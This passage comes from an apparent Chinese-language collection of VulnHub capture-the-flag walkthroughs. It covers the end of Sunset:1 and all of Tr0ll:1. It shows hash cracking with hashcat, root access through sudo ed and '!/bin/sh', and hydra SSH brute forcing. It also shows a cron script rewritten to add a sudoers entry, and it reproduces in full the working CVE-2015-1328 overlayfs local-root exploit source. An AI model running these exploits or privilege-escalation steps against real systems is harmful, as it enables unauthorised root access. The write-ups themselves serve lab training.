Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:640-672
Candidates.#1....: 496580 -> 145263w
Hardware.Mon.#1..: N/A

Approaching final keyspace - workload adjusted.


Session..........: hashcat
Status...........: Exhausted
Hash.Type........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: password.txt
Time.Started.....: Wed Apr 15 10:29:47 2020 (14 mins, 9 secs)
Time.Estimated...: Wed Apr 15 10:43:56 2020 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    16929 H/s (10.62ms) @ Accel:64 Loops:32 Thr:32 Vec:1
Recovered........: 3/5 (60.00%) Digests, 1/2 (50.00%) Salts
Progress.........: 28688720/28688720 (100.00%)
Rejected.........: 0/28688720 (0.00%)
Restore.Point....: 14344360/14344360 (100.00%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:4992-5000
Candidates.#1....: $HEX[284d4f544f29333136] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: N/A

Started: Wed Apr 15 10:29:17 2020
Stopped: Wed Apr 15 10:43:58 2020
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub255.jpg)

使用下面的命令查看已经破解的密码

``` bash
D:\hashcat-5.1.0\hashcat-5.1.0>hashcat64.exe -a 0 -m 1800 password.txt rockyou.txt --show
$6$$4NccGQWPfiyfGKHgyhJBgiadOlP/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/:space
$6$$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0:sky
$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/:cheer14
```

得到三个已经破解的用户和密码

``` bash
space    space
sky      sky
sunset   cheer14
```

#### 利用然后进一步提权

使用用户Sunset通过ssh登录，并在其中找到了名为user.txt的文件，并在其中再次获得了hash文件。

现在，检查哪个文件具有sudo权限，并且发现ed是sudoers的成员。

因此，执行！/bin/sh命令，并获得root访问权限。

以root用户身份登录后，再次找到了一个名为flag.txt的文件；

获得最后的flag。已经成功获得了root访问权限并通关了这个CTF box。

``` bash
root@kali:~# ssh sunset@192.168.56.123
The authenticity of host '192.168.56.123 (192.168.56.123)' can't be established.
ECDSA key fingerprint is SHA256:n9ATwmONo6fCyPblqlvcO7WcIWZJMqBaqDdo/jYnLPI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.123' (ECDSA) to the list of known hosts.
Enter passphrase for key '/root/.ssh/id_rsa': 
sunset@192.168.56.123's password: 
Linux sunset 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jul 28 20:52:38 2019 from 192.168.1.182
sunset@sunset:~$ id
uid=1000(sunset) gid=1000(sunset) groups=1000(sunset),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)
sunset@sunset:~$ whoami
sunset
sunset@sunset:~$ ls
user.txt
sunset@sunset:~$ cat user.txt
5b5b8e9b01ef27a1cc0a2d5fa87d7190
sunset@sunset:~$ sudo -l
Matching Defaults entries for sunset on sunset:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sunset may run the following commands on sunset:
    (root) NOPASSWD: /usr/bin/ed
sunset@sunset:~$ sudo /usr/bin/ed
id
?
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# pwd
/home/sunset
# cd /root
# ls
flag.txt  ftp  server.sh
# cat flag.txt
25d7ce0ee3cbf71efbac61f85d0c14fe
#
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub256.jpg)

#### 知识点总结

 - ftp anonymous用户免密码登录
 - john破解linux sha512 hash值
 - hashcat破解linux sha512 hash值
 - sudo无需密码ed通过!/bin/sh提权

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end sunset-1 -->

</details>

<a id="case-tr0ll-1"></a>

## 历史流量线索与可写清理任务

FTP 与字典连接账户，定时 Python 脚本和 OverlayFS 提供不同本地提权路径。两条原有路线的条件及输出同时保留。

<p class="kb-provenance">来源 Tr0ll-1 · 原记录 2020-03-31 · 18 个代码块 · 4 处图片引用</p>

<details class="kb-evidence" id="record-tr0ll-1">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start Tr0ll-1 -->

#### 名称
名称：Tr0ll: 1
发布日期：2014年8月14日

#### 下载

 - Download: http://overflowsecurity.com/files/Tr0ll.rar
 - Download (Mirror): https://download.vulnhub.com/tr0ll/Tr0ll.rar
 - Download (Torrent): https://download.vulnhub.com/tr0ll/Tr0ll.rar.torrent



#### 描述

Tr0ll的灵感来自OSCP实验室中不断摇曳的机器。目标很简单，获得root权限并从/ root目录获取Proof.txt。不为容易受挫！公平警告，前方有巨魔！难度：初学者类型：boot2root

特别感谢@ OS_Eagle11和@superkojiman自始至终经历了测试！本机应使用DHCP提取IP，如果有任何问题，请与我联系以获取密码以使其正常工作。反馈总是很感激！male

Freenode-Maleus

``` bash
MD5SUM (Tr0ll.rar): 318fe0b1c0dd4fa0a8dca43edace8b20
```

#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sV -p- -v 192.168.66.15
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```

``` bash
root@kali:~# nmap -A -p 21,22,80 -v 192.168.66.15 --script=vuln -T4
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /robots.txt: Robots file
|_  /secret/: Potentially interesting folder
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.7: 
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
|       CVE-2014-0226   6.8     https://vulners.com/cve/CVE-2014-0226
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
|       CVE-2016-2161   5.0     https://vulners.com/cve/CVE-2016-2161
|       CVE-2016-0736   5.0     https://vulners.com/cve/CVE-2016-0736
|       CVE-2014-3523   5.0     https://vulners.com/cve/CVE-2014-3523
|       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
|       CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185
|       CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109
|       CVE-2014-0118   4.3     https://vulners.com/cve/CVE-2014-0118
|       CVE-2014-0117   4.3     https://vulners.com/cve/CVE-2014-0117
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
|_      CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
```

通过枚举，得到了一些有趣的东西：

 - 允许匿名FTP登录
 - HTTP服务有2个有趣的页面：robots.txt和secret

允许匿名FTP

有一个文件lol.pcap，发现一些文本文件名secret_stuff.txt被推送到FTP服务器。该文件包含文本：

``` bash
150 Here comes the directory listing.

-rw-r--r--    1 0        0             147 Aug 10 00:38 secret_stuff.txt

Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P

Sucks, you were so close... gotta TRY HARDER!

150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).
```

发现在具有该路径的Web服务器中没有什么有用的。回到从PCAP文件获得的文本文件中的消息。注意到sup3rs3cr3tdirlol一直是supersecretdirlol的代名词，然后检查了它是否可以是HTTP服务的URL路径。发现/sup3rs3cr3tdirlol/存在并且包含一个文件。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub230.jpg)

检查一下文件类型，发现是一个二进制文件。尝试执行它。

``` bash
root@kali:~/vulnhub/troll# file roflmao
roflmao: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=5e14420eaa59e599c2f508490483d959f3d2cf4f, not stripped
```

不用逆向二进制文件，因为当二进制文件运行时，没有内存地址0x0856BF。所以尝试再次使用0x0856BF作为HTTP服务中的URL路径。

``` bash
root@kali:~/vulnhub/troll# ./roflmao 
Find address 0x0856BF to proceedr
```

发现2个web目录

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub231.jpg)


#### /0x0856BF/good_luck/目录

which_one_lol.txt
包含以下的字段

``` bash
maleus
ps-aux
felux
Eagle11
genphlux < -- Definitely not this one
usmc8892
blawrg
wytshadow
vis1t0r
overflow
```

#### /0x0856BF/this_folder_contains_the_password/目录

Pass.txt
包含以下的字段

``` bash
Good_job_:)
```

#### 利用

这些文件可能是2个用户或密码。首先，将第一个文件用作用户列表，将第二个文件用作密码。
使用hydra爆破

``` bash
root@kali:~/vulnhub/troll# hydra -s 22 -v -V -L users -P pass -e n -t 1 -w 30 192.168.66.15 ssh
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-03-31 03:34:11
[DATA] max 1 task per 1 server, overall 1 task, 20 login tries (l:10/p:2), ~20 tries per task
[DATA] attacking ssh://192.168.66.15:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://maleus@192.168.66.15:22
[INFO] Successful, password authentication is supported by ssh://192.168.66.15:22
[ATTEMPT] target 192.168.66.15 - login "maleus" - pass "" - 1 of 20 [child 0] (0/0)
[ATTEMPT] target 192.168.66.15 - login "maleus" - pass "Good_job_:)" - 2 of 20 [child 0] (0/0)
[ATTEMPT] target 192.168.66.15 - login "ps-aux" - pass "" - 3 of 20 [child 0] (0/0)
[ATTEMPT] target 192.168.66.15 - login "ps-aux" - pass "Good_job_:)" - 4 of 20 [child 0] (0/0)
[ATTEMPT] target 192.168.66.15 - login "felux" - pass "" - 5 of 20 [child 0] (0/0)
[ATTEMPT] target 192.168.66.15 - login "felux" - pass "Good_job_:)" - 6 of 20 [child 0] (0/0)
[ATTEMPT] target 192.168.66.15 - login "Eagle11" - pass "" - 7 of 20 [child 0] (0/0)
[ATTEMPT] target 192.168.66.15 - login "Eagle11" - pass "Good_job_:)" - 8 of 20 [child 0] (0/0)
[ATTEMPT] target 192.168.66.15 - login "genphlux" - pass "" - 9 of 20 [child 0] (0/0)
[ATTEMPT] target 192.168.66.15 - login "genphlux" - pass "Good_job_:)" - 10 of 20 [child 0] (0/0)
[ATTEMPT] target 192.168.66.15 - login "usmc8892" - pass "" - 11 of 20 [child 0] (0/0)
[ATTEMPT] target 192.168.66.15 - login "usmc8892" - pass "Good_job_:)" - 12 of 20 [child 0] (0/0)
[ATTEMPT] target 192.168.66.15 - login "blawrg" - pass "" - 13 of 20 [child 0] (0/0)
[ATTEMPT] target 192.168.66.15 - login "blawrg" - pass "Good_job_:)" - 14 of 20 [child 0] (0/0)
[ATTEMPT] target 192.168.66.15 - login "wytshadow" - pass "" - 15 of 20 [child 0] (0/0)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.66.15 - login "wytshadow" - pass "" - 15 of 20 [child 0] (0/0)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.66.15 - login "wytshadow" - pass "" - 15 of 20 [child 0] (0/0)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.66.15 - login "wytshadow" - pass "" - 15 of 20 [child 0] (0/0)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.66.15 - login "wytshadow" - pass "" - 15 of 20 [child 0] (0/0)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.66.15 - login "wytshadow" - pass "" - 15 of 20 [child 0] (0/0)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.66.15 - login "wytshadow" - pass "" - 15 of 20 [child 0] (0/0)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.66.15 - login "wytshadow" - pass "" - 15 of 20 [child 0] (0/0)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.66.15 - login "wytshadow" - pass "" - 15 of 20 [child 0] (0/0)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.66.15 - login "wytshadow" - pass "" - 15 of 20 [child 0] (0/0)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.66.15 - login "wytshadow" - pass "" - 15 of 20 [child 0] (0/0)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.66.15 - login "wytshadow" - pass "" - 15 of 20 [child 0] (0/0)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.66.15 - login "wytshadow" - pass "" - 15 of 20 [child 0] (0/0)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.66.15 - login "wytshadow" - pass "" - 15 of 20 [child 0] (0/0)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.66.15 - login "wytshadow" - pass "" - 15 of 20 [child 0] (0/0)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[ATTEMPT] target 192.168.66.15 - login "wytshadow" - pass "Good_job_:)" - 16 of 21 [child 0] (0/1)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[ATTEMPT] target 192.168.66.15 - login "vis1t0r" - pass "" - 17 of 22 [child 0] (0/2)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[ATTEMPT] target 192.168.66.15 - login "vis1t0r" - pass "Good_job_:)" - 18 of 23 [child 0] (0/3)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[ATTEMPT] target 192.168.66.15 - login "overflow" - pass "" - 19 of 23 [child 0] (0/3)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[ATTEMPT] target 192.168.66.15 - login "overflow" - pass "Good_job_:)" - 20 of 23 [child 0] (0/3)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[REDO-ATTEMPT] target 192.168.66.15 - login "wytshadow" - pass "" - 21 of 23 [child 0] (1/3)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[REDO-ATTEMPT] target 192.168.66.15 - login "wytshadow" - pass "Good_job_:)" - 22 of 23 [child 0] (2/3)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[REDO-ATTEMPT] target 192.168.66.15 - login "vis1t0r" - pass "" - 23 of 23 [child 0] (3/3)
[ERROR] could not connect to target port 22: Connection refused
[ERROR] ssh protocol error
[STATUS] attack finished for 192.168.66.15 (waiting for children to complete tests)
1 of 1 target completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-03-31 03:34:49
```

问题始于用户blawrg，如果hydra无法登录，则主机将阻止Kali的IP。必须更改Kali的IP，然后才能开始尝试新用户。爆破完成，但是没有用户可以登录。

注意到包含Pass.txt的目录是this_folder_contains_the_password。这可能意味着某些情况，因此再次尝试使用Pass.txt作为密码，但溢出后可以使用密码WTH！登录。

``` bash
[RE-ATTEMPT] target 192.168.66.15 - login "vis1t0r" - pass "" - 16 of 20 [child 2] (0/0)
[ATTEMPT] target 192.168.66.15 - login "vis1t0r" - pass "" - 17 of 20 [child 0] (0/0)
[ATTEMPT] target 192.168.66.15 - login "vis1t0r" - pass "Pass.txt" - 18 of 20 [child 2] (0/0)
[ATTEMPT] target 192.168.66.15 - login "overflow" - pass "" - 19 of 20 [child 0] (0/0)
[ATTEMPT] target 192.168.66.15 - login "overflow" - pass "Pass.txt" - 20 of 20 [child 0] (0/0)
[22][ssh] host: 192.168.66.15   login: overflow   password: Pass.txt
[STATUS] attack finished for 192.168.66.15 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-03-31 03:41:02
```

成功登录

``` bash
root@kali:~# ssh overflow@192.168.66.15
Enter passphrase for key '/root/.ssh/id_rsa': 
overflow@192.168.66.15's password: 
Permission denied, please try again.
overflow@192.168.66.15's password: 
Welcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic i686)

 * Documentation:  https://help.ubuntu.com/
New release '16.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Aug 13 01:14:09 2014 from 10.0.0.12
Could not chdir to home directory /home/overflow: No such file or directory
$ id
uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
$ whoami
overflow
```

#### 提权

登录后，尝试找到该flag，但找不到。由于overflow是低权限用户，因此必须提权并找到root flag，然后再访问更多目录。

 - 已经检查crontabs，并且没有文件可写。
 - tmp目录为空

我开始在var/中检查world可写文件。没有有趣的文件，但是只有一个。

``` bash
$ l_path=var/*/*;while [ "$l_path" != / -a "$l_path" != . ]; do ls -ld $l_path; l_path=$(dirname -- "$l_path");done;
...
-rwxrwxrwx  1 root       root            23 Aug 13  2014 var/log/cronlog
...

```
检查var/log/cronlog

``` bash
$ cat var/log/cronlog
*/2 * * * * cleaner.py
```

这是cron job，每2分钟运行一次。如果可以修改cleaner.py并让系统做点什么，那么就可以升级overflow的权限。但是首先，必须找到cleaner.py。

``` bash
$ find / -name cleaner.py 2>/dev/null | grep "cleaner.py"
/lib/log/cleaner.py
```

查看cleaner.py

``` bash
$ cat /lib/log/cleaner.py
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /tmp/* ')
except:
        sys.exit()
```

找到了python文件，它是可写的。


 - 修改cleaner.py

通过向帐户溢出添加sudo su	权限来修改了cleaner.py。当执行bash命令sudo su时，会得到root shell。

``` bash
overflow@troll:/$ cat /lib/log/cleaner.py
#!/usr/bin/env python
import os
import sys
try:
        os.system('echo "overflow ALL=(ALL:ALL) ALL" >> /etc/sudoers')
except:
        sys.exit()
```

等待2分钟...。靶机将我踢了出去，再次登录并可升级为root。

``` bash
$ sudo su

[sudo] password for overflow: 
Sorry, try again.
[sudo] password for overflow: 
root@troll:/# id
uid=0(root) gid=0(root) groups=0(root)
root@troll:/# whoami
root
root@troll:/# pwd
/
root@troll:/# cd /root
root@troll:~# ls
proof.txt
root@troll:~# cat proof.txt
Good job, you did it! 


702a8c18d29c6f3ca0d99ef5712bfbdc
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub232.jpg)


#### 提权2

linux 内核提权

参考[Linux-Kernel-3.13.0-3.19-Ubuntu-12.04/14.04/14.10/15.04-'overlayfs'-Local-Privilege-Escalation](https://www.exploit-db.com/exploits/37292)


 - CVE : CVE-2015-1328 

``` bash
/*
# Exploit Title: ofs.c - overlayfs local root in ubuntu
# Date: 2015-06-15
# Exploit Author: rebel
# Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)
# Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04
# CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)

*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
CVE-2015-1328 / ofs.c
overlayfs incorrect permission handling + FS_USERNS_MOUNT

user@ubuntu-server-1504:~$ uname -a
Linux ubuntu-server-1504 3.19.0-18-generic #18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
user@ubuntu-server-1504:~$ gcc ofs.c -o ofs
user@ubuntu-server-1504:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),30(dip),46(plugdev)
user@ubuntu-server-1504:~$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),1000(user)

greets to beist & kaliman
2015-05-24
%rebel%
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>
#include <string.h>
#include <linux/sched.h>

#define LIB "#include <unistd.h>\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n{\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &path, 128);\nif(geteuid() == 0 && !strcmp(path, \"/bin/su\")) {\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n}\n    return _real_getuid();\n}\n"

static char child_stack[1024*1024];

static int
child_exec(void *stuff)
{
    char *file;
    system("rm -rf /tmp/ns_sploit");
    mkdir("/tmp/ns_sploit", 0777);
    mkdir("/tmp/ns_sploit/work", 0777);
    mkdir("/tmp/ns_sploit/upper",0777);
    mkdir("/tmp/ns_sploit/o",0777);

    fprintf(stderr,"mount #1\n");
    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper") != 0) {
// workdir= and "overlay" is needed on newer kernels, also can't use /proc as lower
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work") != 0) {
            fprintf(stderr, "no FS_USERNS_MOUNT for overlayfs on this kernel\n");
            exit(-1);
        }
        file = ".access";
        chmod("/tmp/ns_sploit/work/work",0777);
    } else file = "ns_last_pid";

    chdir("/tmp/ns_sploit/o");
    rename(file,"ld.so.preload");

    chdir("/");
    umount("/tmp/ns_sploit/o");
    fprintf(stderr,"mount #2\n");
    if (mount("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc") != 0) {
        if (mount("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work") != 0) {
            exit(-1);
        }
        chmod("/tmp/ns_sploit/work/work",0777);
    }

    chmod("/tmp/ns_sploit/o/ld.so.preload",0777);
    umount("/tmp/ns_sploit/o");
}

int
main(int argc, char **argv)
{
    int status, fd, lib;
    pid_t wrapper, init;
    int clone_flags = CLONE_NEWNS | SIGCHLD;

    fprintf(stderr,"spawning threads\n");

    if((wrapper = fork()) == 0) {
        if(unshare(CLONE_NEWUSER) != 0)
            fprintf(stderr, "failed to create new user namespace\n");

        if((init = fork()) == 0) {
            pid_t pid =
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
            if(pid < 0) {
                fprintf(stderr, "failed to create new mount namespace\n");
                exit(-1);
            }

            waitpid(pid, &status, 0);

        }

        waitpid(init, &status, 0);
        return 0;
    }

    usleep(300000);

    wait(NULL);

    fprintf(stderr,"child threads done\n");

    fd = open("/etc/ld.so.preload",O_WRONLY);

    if(fd == -1) {
        fprintf(stderr,"exploit failed\n");
        exit(-1);
    }

    fprintf(stderr,"/etc/ld.so.preload created\n");
    fprintf(stderr,"creating shared library\n");
    lib = open("/tmp/ofs-lib.c",O_CREAT|O_WRONLY,0777);
    write(lib,LIB,strlen(LIB));
    close(lib);
    lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
    if(lib != 0) {
        fprintf(stderr,"couldn't create dynamic library\n");
        exit(-1);
    }
    write(fd,"/tmp/ofs-lib.so\n",16);
    close(fd);
    system("rm -rf /tmp/ns_sploit /tmp/ofs-lib.c");
    execl("/bin/su","su",NULL);
}
```

过程太简单在这里就不多写文演示了

#### 知识点总结

 - ftp匿名登录
 - hydra爆破ssh密码
 - cron job + world writeable py脚本提权
 - CVE-2015-1328 linux内核提权

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>


<!-- kb:end Tr0ll-1 -->

</details>

<a id="case-tr0ll-3"></a>

## 无线捕获、编辑历史与权限程序

cap 数据、代理与 viminfo 提供账户线索，原文跟踪 SUID 程序及 setresuid 的执行结果。

<p class="kb-provenance">来源 Tr0ll-3 · 原记录 2020-04-07 · 22 个代码块 · 5 处图片引用</p>

<details class="kb-evidence" id="record-tr0ll-3">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start Tr0ll-3 -->

#### 名称
名称：Tr0ll: 3
发布日期：2019年8月6日

#### 下载

 - Download: https://drive.google.com/file/d/1Jshz0VifMrw3S-Kcq8C3nf9HMQtXuKrW/view
 - Download (Mirror): https://download.vulnhub.com/tr0ll/Tr0ll3.ova
 - Download (Torrent): https://download.vulnhub.com/tr0ll/Tr0ll3.ova.torrent



#### 描述

Tr0ll系列的最新版本。这与之前的迭代略有不同，仍然处于Beginner++级别。希望每个人都玩得开心，请确保在flag的屏幕截图上标记@ Maleus21。

您将需要使用start：here登录ssh

类型：Boot 2 root
目标：获取flag.txt
难度：初学者++
